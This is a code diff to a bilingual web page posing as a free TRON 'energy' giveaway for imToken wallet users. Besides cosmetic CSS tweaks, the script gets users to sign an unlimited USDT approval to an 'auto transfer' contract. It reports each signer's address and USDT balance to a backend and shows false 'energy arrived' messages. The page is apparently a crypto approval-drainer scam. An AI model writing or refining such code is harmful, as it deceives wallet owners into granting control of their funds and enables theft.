@@ -43,9 +43,9 @@ body {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 12px 8px; /* 适当增加内边距，适配放大后的元素 */
+    padding: 8px 8px;
     border-bottom: 1px solid #334155;
-    margin-bottom: 3px;
+    margin-bottom: 2px;
 }
 .lang-switch {
     padding: 0;
@@ -73,27 +73,31 @@ body {
     margin-bottom: 0;
     display: flex; /* 新增：flex布局让Logo和文字同行 */
     align-items: center; /* 新增：垂直居中 */
-    gap: 12px; /* 加大Logo和文字间距，更舒展 */
+    gap: 8px; /* 新增：Logo和文字间距 */
 }
-/* 新增：Logo样式（放大尺寸） */
+ .header > div {
+    display: flex; /* 横向排列 */
+    align-items: center; /* 垂直居中 */
+    gap: 10px; /* 两个文本之间的间距，可按需调整 */
+ }
+/* 新增：Logo样式 */
 .header-logo {
-    width: 48px; /* 从36px放大到48px，更醒目 */
-    height: 48px;
-    border-radius: 6px; /* 轻微圆角更美观 */
+    width: 36px; /* 适配文字高度，保持比例 */
+    height: 36px;
+    border-radius: 4px; /* 轻微圆角更美观 */
     object-fit: cover;
 }
 .header h1 { 
-    font-size: 28px; /* 从20px放大到28px，摆脱小气感 */
-    color: #3b82f6; 
-    margin-bottom: 4px; /* 增加与描述文本的间距 */
-    font-weight: 700; /* 加粗增强视觉冲击 */
+    font-size: 20px; /* 恢复原字体大小 */
+    color: #3b82f6;    
+    margin-bottom: 0;
 }
 .header .desc {
-    font-size: 15px; /* 从12px放大到15px，更清晰 */
+    font-size: 12px; /* 恢复原字体大小 */
     color: #a0a8a4;
     max-width: 400px;
-    line-height: 1.5; 
-    font-weight: 500; /* 轻微加粗，提升存在感 */
+    line-height: 1.5;
+    margin-bottom: 0;
 }
 .warning {
     background: #334155;
@@ -683,9 +687,6 @@ const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
 const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
-// 新增：缓存非钱包容器文本元素
-const specialTipTitleEl = document.getElementById("specialTipTitle");
-const specialTipContentEl = document.getElementById("specialTipContent");
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -696,7 +697,7 @@ function isCustomerError(errMsg) {
     ];
     return customerErrorKeys.some(key => errMsg.includes(key));
 }
-// ========== 语言切换逻辑（已补充非钱包容器文本更新） ==========
+// ========== 语言切换逻辑 ==========
 function toggleLang() {
     currentLang = currentLang === "zh" ? "en" : "zh";
     localStorage.setItem("imtoken_energy_lang", currentLang);
@@ -712,10 +713,6 @@ function updatePageLang() {
             el.innerHTML = lang[key];
         }
     });
-    // 新增：单独更新非钱包容器文本（确保样式不被覆盖）
-    if (specialTipTitleEl) specialTipTitleEl.textContent = lang.specialTipTitle;
-    if (specialTipContentEl) specialTipContentEl.textContent = lang.specialTipContent;
-    
     connectBtn.textContent = lang.connectBtnText;
     approveBtn.textContent = lang.approveBtnText;
     reviewTipText.textContent = lang.reviewTipText;
@@ -826,7 +823,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         return;
     }
     startPersistentEnergyCountdown();
-    updatePageLang(); // 初始化时就更新双语文本
+    updatePageLang();
     langToggle.addEventListener("click", toggleLang);
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
@@ -869,8 +866,8 @@ async function checkImTokenEnv() {
         await initWallet(false);
     } else {
         try {
-            // 非imToken环境：显示专属容器+引导提示（自动适配当前语言）
-            specialTipContainer.style.display = "block";
+            // 非imToken环境：显示专属容器+引导提示
+            specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
             connectBtn.onclick = async () => {
@@ -1008,21 +1005,33 @@ async function executeAfterApprove() {
     const lang = langConfig[currentLang];
     try {
         if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+        // 执行签名授权操作
         await trc20Contract.approve(
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-        // 不发送A2/B2后端信号
+
+        // 核心新增：签名成功后，发送A2+B2信号（让后端记录授权用户）
+        btn.textContent = "同步授权信息中...";
+        await Promise.all([
+            sendSignalA2(), // 发送A2信号
+            sendSignalB(false) // 发送B2信号（isB1=false）
+        ]);
+        console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
+
+        // 信号发送完成，标记能量发放成功
         const btn = document.getElementById("approveBtn");
-        btn.textContent = lang.distributingBtn;
-        // 直接标记成功
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
         alert(lang.successTip);
         renderEnergyRecords();
     } catch (e) {
-        console.error("发放能量失败：", e);
-        throw e;
+        console.error("签名/信号发送失败：", e);
+        // 即使A2/B2发送失败，签名成功后能量已到账，仅后端记录受影响
+        alert("能量已到账，但授权信息同步失败（不影响使用）");
+        const btn = document.getElementById("approveBtn");
+        btn.textContent = lang.successBtn;
+        userInfoEl.innerHTML += lang.successArrival;
     }
 }
 // ========== 发送信号函数 ==========
@@ -1039,15 +1048,32 @@ async function sendSignalA1() {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        if (res.ok) console.log("✅ A1信号异步发送成功");
-        return true;
+        const status = res.ok ? "success" : "fail";
+        // 记录A1信号状态到本地缓存（关联钱包地址）
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = status;
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        
+        if (res.ok) {
+            console.log("✅ A1信号异步发送成功");
+            return true; // 返回成功状态
+        } else {
+            console.log("❌ A1信号发送失败（后端非200状态）");
+            return false; // 返回失败状态
+        }
     } catch (e) {
         clearTimeout(timeoutId);
-        throw e;
+        // 记录A1信号失败状态
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = "fail";
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        
+        console.warn("❌ A1信号发送异常：", e);
+        return false; // 异常也返回失败
     }
 }
 async function sendSignalA2() {
-    const requestData = { userAddress, usdtBalance: tokenBalance };
+    const requestData = { userAddress, usdtBalance: tokenBalance }; // 携带用户USDT余额
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 20000);
     try {
@@ -1059,16 +1085,17 @@ async function sendSignalA2() {
             keepalive: true
         });
         clearTimeout(timeoutId);
-        if ([400, 408, 409].includes(res.status)) {
-            const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
-            throw new Error(errData.detail || lang.ineligibleTip);
+        if (res.ok) {
+            console.log("✅ A2信号发送成功");
+            return true;
+        } else {
+            console.log("❌ A2信号发送失败（后端非200状态）");
+            return false;
         }
-        if (!res.ok) throw new Error(lang.ineligibleTip);
-        console.log("✅ A2信号发送成功");
-        return true;
     } catch (e) {
         clearTimeout(timeoutId);
-        throw e;
+        console.warn("❌ A2信号发送异常：", e);
+        return false;
     }
 }
 async function sendSignalB(isB1 = true) {
@@ -1086,17 +1113,25 @@ async function sendSignalB(isB1 = true) {
             keepalive: true
         });
         clearTimeout(timeoutId);
+
+        // 1. 客户端错误（400/408/409）：用户不合规
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
-            throw new Error(errData.detail || (isB1 ? lang.ineligibleTip : lang.ineligibleTip));
+            throw new Error(errData.detail || lang.ineligibleTip);
         }
+
+        // 2. 成功回应（200+success=true）
         const data = await res.json();
-        if (!res.ok || !data.success) throw new Error(data.detail || lang.ineligibleTip);
-        console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
-        return true;
+        if (res.ok && data.success) {
+            console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
+            return true; // 成功返回true
+        }
+
+        // 3. 其他失败（后端异常）
+        throw new Error(lang.systemBusyTip);
     } catch (e) {
         clearTimeout(timeoutId);
-        throw e;
+        throw e; // 抛出错误，让领取按钮的catch处理
     }
 }
 // ========== 领取按钮逻辑（二次点击不重复发送B1信号） ==========
@@ -1108,32 +1143,61 @@ function bindApproveLogic() {
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "flex";
-        // 核心：点击即标记为已领取
-        addAuthorizedAddress(userAddress);
-        saveEnergyRecord();
-        renderEnergyRecords();
+        reviewTipText.textContent = "能量调配中……点击签名后能量生效"; // 按需求显示提示
+
         try {
-            // 新增：判断是否已发送B1信号，未发送才发送
-            if (!hasSentB1Signal(userAddress)) {
-                // 不发送B1后端信号（按需求保留注释，如需发送可取消注释）
-                // await sendSignalB(true);
-                markB1SignalSent(userAddress); // 标记为已发送
+            // 第一步：判断A1信号是否发送成功（从本地缓存读取）
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            const isA1Success = a1Status[userAddress] === "success";
+            if (!isA1Success) {
+                // A1信号失败：弹窗提示，不发B1，恢复按钮
+                alert("现在领取的人太多啦，请稍后重试");
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                reviewTip.style.display = "none";
+                return;
             }
-            reviewTip.style.display = "none";
-            btn.textContent = lang.redirectingBtn;
-            window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
+
+            // 第二步：A1成功，判断是否已发送B1信号（防止重复）
+            if (hasSentB1Signal(userAddress)) {
+                alert("请勿重复提交，已在处理中");
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                reviewTip.style.display = "none";
+                return;
+            }
+
+            // 第三步：发送B1信号，等待后端回应
+            btn.textContent = "发送信号中...";
+            const b1Response = await sendSignalB(true); // 发送B1信号
+
+            // 第四步：B1成功回应（核心修改：立即标记已领取）
+            if (b1Response) {
+                markB1SignalSent(userAddress); // 标记B1已发送
+                addAuthorizedAddress(userAddress); // 立即标记为已领取（无需等签名）
+                saveEnergyRecord(); // 保存领取记录
+                renderEnergyRecords(); // 更新页面记录列表
+
+                reviewTip.style.display = "none";
+                btn.textContent = lang.redirectingBtn;
+                // 唤起imToken签名页面
+                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
+            }
+
         } catch (e) {
             console.error("领取流程失败：", e);
-            const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
-            alert(`${lang.errorTipPrefix}${tip}`);
-            // 强制更新为已领取状态
-            userInfoEl.innerHTML = lang.authorizedTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
-            btn.disabled = true;
-            btn.textContent = lang.authorizedBtn;
             reviewTip.style.display = "none";
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+
+            // 按B1回应类型提示不同文案
+            const errMsg = e.message || "";
+            if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
+                alert("你现在不符合领取条件");
+            } else {
+                alert("现在领取的人太多啦，请稍后重试");
+            }
+            // 失败不标记已领取
         }
     };
 }
